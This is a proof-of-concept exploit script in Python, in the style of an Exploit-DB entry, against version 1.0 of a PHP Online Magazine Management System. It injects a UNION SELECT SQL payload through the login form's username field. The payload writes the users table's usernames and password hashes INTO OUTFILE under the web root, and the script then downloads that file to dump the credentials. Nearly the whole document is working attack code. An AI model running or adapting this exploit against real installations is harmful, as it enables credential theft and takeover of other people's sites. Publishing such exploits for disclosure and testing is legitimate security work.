# Exploit Title: SQL Injection on login page leading to credential dumping
# Date: 13/12/2021
# Exploit Author: evdaez
# Vendor Homepage: https://www.sourcecodester.com/php/15061/online-magazine-management-system-php-free-source-code.html
# Software Link: https://www.sourcecodester.com/download-code?nid=15061&title=Online+Magazine+Management+System+in+PHP+with+Free+Source+Code
# Version: 1.0
# Tested on: XAMPP Windows 10
import requests
import binascii
from os import system, urandom

def clear_screen():
    system("cls")

def login(ip, proxies, username, password):
    sess = requests.session()

    # http://localhost/magazines/admin/login.php
    loginURL = f"http://{ip}/magazines/classes/Login.php?f=login"

    data = {
        "username": username,
        "password": password
    }

    req = sess.post(loginURL, data=data, proxies=proxies, verify=False, allow_redirects=False)
    print(f"[+] Response:\n{req.text}")

def processFile(pathToFile):
    print(f"\n[+] Processing:\n{pathToFile}")
    with open(pathToFile, "r") as f:
        newLines = []
        lines = f.readlines()

        for line in lines:
            newLines.append(line.replace("\\N", "").strip())

    print(f"\n[+] Writing:\n{pathToFile}")
    with open(pathToFile, "w") as f:
        for line in newLines:
            f.write(line + "\n")

if __name__ == "__main__":
    proxies = {"http":"http://127.0.0.1:8080", "https":"https://127.0.0.1:8080"}
    ip = '127.0.0.1'

    randomFilename = binascii.hexlify(urandom(16)).decode()
    pathToFile = f"C://xampp//htdocs//magazines//{randomFilename}.txt"

    username = f"admin' UNION SELECT id,username,password,avatar,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM users into outfile \"{pathToFile}\" -- -"
    password = 'test'

    clear_screen()
    login(ip, proxies, username, password)
    processFile(pathToFile)

    print("\n[+] Results:\n")
    req = requests.get(f"http://{ip}/magazines/{randomFilename}.txt", proxies=proxies, verify=False, allow_redirects=False)
    print(req.text)